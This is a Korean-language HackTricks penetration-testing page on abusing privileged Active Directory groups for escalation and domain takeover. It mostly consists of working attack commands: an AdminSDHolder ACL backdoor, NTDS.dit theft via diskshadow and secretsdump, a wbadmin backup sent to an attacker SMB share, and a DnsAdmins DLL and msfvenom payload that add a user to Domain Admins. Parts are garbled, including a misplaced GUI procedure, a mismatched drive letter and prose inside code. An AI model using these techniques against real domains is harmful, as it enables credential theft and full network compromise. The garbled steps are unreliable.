# 특권 그룹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

## 관리 권한이 있는 잘 알려진 그룹

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

## 계정 운영자

이 그룹은 도메인에서 관리자가 아닌 계정과 그룹을 생성할 수 있도록 권한을 부여합니다. 또한 도메인 컨트롤러(DC)에 로컬 로그인을 가능하게 합니다.

이 그룹의 구성원을 식별하기 위해 다음 명령을 실행합니다:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
새로운 사용자 추가가 허용되며, DC01에 로컬 로그인도 가능합니다.

## AdminSDHolder 그룹

**AdminSDHolder** 그룹의 액세스 제어 목록(ACL)은 Active Directory 내의 모든 "보호 그룹"에 대한 권한을 설정하는 중요한 요소입니다. 이 메커니즘은 무단 수정을 방지하여 이러한 그룹의 보안을 보장합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 일반 사용자에게 완전한 권한을 부여함으로써 이를 악용할 수 있습니다. 이렇게 하면 해당 사용자가 모든 보호 그룹을 완전히 제어할 수 있게 됩니다. 이 사용자의 권한이 변경되거나 제거되면, 시스템의 설계로 인해 1시간 이내에 자동으로 복원됩니다.

멤버를 검토하고 권한을 수정하는 명령어는 다음과 같습니다:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
복원 프로세스를 가속화하기 위한 스크립트가 제공됩니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 방문하세요.

## AD Recycle Bin

이 그룹에 속해 있으면 삭제된 Active Directory 개체를 읽을 수 있으며, 이는 민감한 정보를 노출시킬 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 도메인 컨트롤러 접근

DC의 파일에 대한 접근은 사용자가 `Server Operators` 그룹의 일부인 경우에만 허용되며, 이는 액세스 수준을 변경합니다.

### 권한 상승

Sysinternals의 `PsService` 또는 `sc`를 사용하여 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어, `Server Operators` 그룹은 특정 서비스에 대해 완전한 제어권을 가지고 있으므로 임의의 명령 실행과 권한 상승이 가능합니다:
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 완전한 액세스 권한을 갖고 있으며, 권한 상승을 위해 서비스를 조작할 수 있게 합니다.

## 백업 연산자

`백업 연산자` 그룹에 소속되면 `SeBackup` 및 `SeRestore` 권한으로 인해 `DC01` 파일 시스템에 액세스할 수 있습니다. 이러한 권한은 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 사용하여 명시적인 권한 없이도 폴더 탐색, 목록 및 파일 복사 기능을 가능하게 합니다. 이 과정에는 특정 스크립트를 사용해야 합니다.

그룹 구성원을 나열하려면 다음을 실행하세요:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 로컬 공격

이러한 권한을 로컬에서 활용하기 위해 다음 단계를 사용합니다:

1. 필요한 라이브러리 가져오기:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:

```plaintext
1. `secpol.msc`를 실행하여 로컬 보안 정책 편집기를 엽니다.
2. "보안 설정" > "로컬 정책" > "사용자 권한 할당"으로 이동합니다.
3. "백업 파일 및 디렉터리" 권한을 찾아 더블 클릭합니다.
4. "보안 설정" 탭에서 "사용자 또는 그룹 추가"를 클릭합니다.
5. "고급" 버튼을 클릭하고 "검색"을 클릭합니다.
6. "고급 검색" 창에서 "찾기"를 클릭합니다.
7. "객체 유형"에서 "그룹"을 선택하고 "위치"에서 "현재 컴퓨터"를 선택합니다.
8. "이름" 상자에 "백업 연산자"를 입력하고 "확인"을 클릭합니다.
9. "백업 연산자" 그룹을 선택하고 "확인"을 클릭합니다.
10. "백업 파일 및 디렉터리" 창에서 "백업 파일 및 디렉터리" 권한을 부여합니다.
11. "확인"을 클릭하여 변경 사항을 저장합니다.
12. 컴퓨터를 다시 시작하여 변경 사항이 적용되었는지 확인합니다.
13. `whoami /priv` 명령을 사용하여 `SeBackupPrivilege` 권한이 활성화되었는지 확인합니다.
```

위 단계를 따라하면 `SeBackupPrivilege` 권한을 활성화하고 확인할 수 있습니다.
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉토리에서 파일에 접근하고 복사합니다. 예를 들어:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 공격

도메인 컨트롤러의 파일 시스템에 직접 접근하면 도메인 사용자 및 컴퓨터의 모든 NTLM 해시를 포함하는 `NTDS.dit` 데이터베이스를 도난할 수 있습니다.

#### diskshadow.exe 사용

1. `C` 드라이브의 그림자 복사본을 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 그림자 복사에서 `NTDS.dit`를 복사합니다:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
대신 파일 복사에 `robocopy`를 사용하세요:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 해시 검색을 위해 `SYSTEM`과 `SAM`을 추출합니다:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 해시를 검색합니다:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exe 사용

1. 공격자 컴퓨터에서 SMB 서버를 위한 NTFS 파일 시스템을 설정하고 대상 컴퓨터에 SMB 자격 증명을 캐시합니다.
2. 시스템 백업 및 `NTDS.dit` 추출을 위해 `wbadmin.exe`를 사용합니다:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

실제 시연은 [IPPSEC와 함께한 데모 비디오](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)를 참조하십시오.

## DnsAdmins

**DnsAdmins** 그룹의 구성원은 DNS 서버에서 임의의 DLL을 SYSTEM 권한으로 로드하여 악용할 수 있습니다. 이 기능은 중대한 악용 가능성을 제공합니다.

DnsAdmins 그룹의 구성원을 나열하려면 다음을 사용하십시오:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 임의의 DLL 실행

멤버들은 다음과 같은 명령을 사용하여 DNS 서버가 임의의 DLL(로컬 또는 원격 공유에서)을 로드하도록 할 수 있습니다:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS 서비스를 다시 시작하는 것은 DLL이 로드되기 위해 필요합니다(추가 권한이 필요할 수 있음):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
더 자세한 내용은 ired.team을 참조하십시오.

#### Mimilib.dll
mimilib.dll을 사용하여 명령 실행을 할 수도 있으며, 특정 명령이나 리버스 쉘을 실행하도록 수정할 수 있습니다. [이 게시물](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)에서 자세한 정보를 확인하십시오.

### MitM을 위한 WPAD 레코드
DnsAdmins는 전역 쿼리 차단 목록을 비활성화한 후 WPAD 레코드를 생성하여 Man-in-the-Middle (MitM) 공격을 수행할 수 있습니다. Responder나 Inveigh와 같은 도구를 사용하여 스푸핑하고 네트워크 트래픽을 캡처할 수 있습니다.

### 이벤트 로그 리더
멤버는 이벤트 로그에 액세스하여 평문 암호나 명령 실행 세부 정보와 같은 민감한 정보를 찾을 수 있습니다:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows 권한
이 그룹은 도메인 객체의 DACL을 수정할 수 있으며, 이로 인해 DCSync 권한이 부여될 수 있습니다. 이 그룹을 이용한 권한 상승 기법은 Exchange-AD-Privesc GitHub 저장소에서 자세히 설명되어 있습니다.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V 관리자
Hyper-V 관리자는 Hyper-V에 대한 완전한 액세스 권한을 갖고 있으며, 이를 통해 가상화된 도메인 컨트롤러를 제어할 수 있습니다. 이는 실시간 도메인 컨트롤러를 복제하고 NTDS.dit 파일에서 NTLM 해시를 추출하는 것을 포함합니다.

### 공격 예시
Hyper-V 관리자는 Firefox의 Mozilla Maintenance Service를 악용하여 SYSTEM으로 명령을 실행할 수 있습니다. 이를 위해 보호된 SYSTEM 파일에 대한 하드 링크를 생성하고 악성 실행 파일로 교체하는 것이 포함됩니다:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
참고: 최근 Windows 업데이트에서는 하드 링크 취약점이 완화되었습니다.

## 조직 관리

**Microsoft Exchange**가 배포된 환경에서는 **조직 관리**라는 특별한 그룹이 중요한 기능을 가지고 있습니다. 이 그룹은 **모든 도메인 사용자의 메일박스에 액세스**할 수 있으며 **'Microsoft Exchange Security Groups'** 조직 단위(OU)에 대한 **완전한 제어 권한**을 유지합니다. 이 제어 권한에는 권한 상승을 위해 악용할 수 있는 **`Exchange Windows Permissions`** 그룹도 포함됩니다.

### 권한 악용 및 명령어

#### 프린트 운영자
**프린트 운영자** 그룹의 구성원은 **`SeLoadDriverPrivilege`**를 포함한 여러 권한을 가지고 있습니다. 이 권한을 사용하면 **도메인 컨트롤러에 로컬로 로그인**, 종료 및 프린터 관리가 가능합니다. 특히 **`SeLoadDriverPrivilege`**가 상승되지 않은 상태에서는 사용자 계정 제어(UAC) 우회가 필요합니다.

이 그룹의 구성원을 나열하기 위해 다음 PowerShell 명령어를 사용합니다:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
**`SeLoadDriverPrivilege`**와 관련된 보다 자세한 공격 기술에 대해서는 특정 보안 자료를 참조해야 합니다.

#### 원격 데스크톱 사용자
이 그룹의 구성원은 원격 데스크톱 프로토콜(RDP)을 통해 PC에 액세스할 수 있습니다. 이 구성원을 열거하기 위해 PowerShell 명령어를 사용할 수 있습니다:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP를 악용하는 더 자세한 정보는 전용 펜테스팅 리소스에서 찾을 수 있습니다.

#### 원격 관리 사용자
회원들은 **Windows 원격 관리 (WinRM)**를 통해 PC에 액세스할 수 있습니다. 이러한 회원들의 열거는 다음과 같이 수행됩니다:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**와 관련된 공격 기법에 대한 자세한 문서를 참조해야 합니다.

#### 서버 운영자
이 그룹은 도메인 컨트롤러에서 백업 및 복원 권한, 시스템 시간 변경 및 시스템 종료와 같은 다양한 구성을 수행할 수 있는 권한을 가지고 있습니다. 구성원을 열거하기 위해 제공되는 명령은 다음과 같습니다:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 참고 자료 <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드하려면 [구독 요금제](https://github.com/sponsors/carlospolop)를 확인하세요!
* [공식 PEASS & HackTricks 스웨그](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [NFT](https://opensea.io/collection/the-peass-family) 컬렉션인 [The PEASS Family](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [Discord 그룹](https://discord.gg/hRep4RUj7f) 또는 [텔레그램 그룹](https://t.me/peass)에 가입하거나 Twitter에서 [carlospolopm](https://twitter.com/hacktricks_live)을 팔로우하세요.
* [HackTricks](https://github.com/carlospolop/hacktricks)와 [HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 해킹 기법을 공유하세요.

</details>
